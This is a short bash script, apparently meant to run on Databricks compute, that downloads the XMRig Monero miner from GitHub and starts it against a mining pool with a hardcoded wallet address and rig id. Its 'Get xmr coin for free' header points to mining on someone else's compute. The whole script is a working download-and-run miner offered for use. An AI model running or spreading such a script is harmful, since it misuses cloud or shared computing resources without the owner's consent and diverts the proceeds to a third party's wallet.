#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
tar xvzf xmrig-6.16.4-focal-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u 84x38oKAVTfFvbrWsCT8Ut2bEzoC1eyXXeD1ja7KnwBgcZkbMdvhY9YZMZPP5e6gkoQoL7ngLN8mGMDeDNFUpFzaVDC42Fa -k --tls --rig-id aank
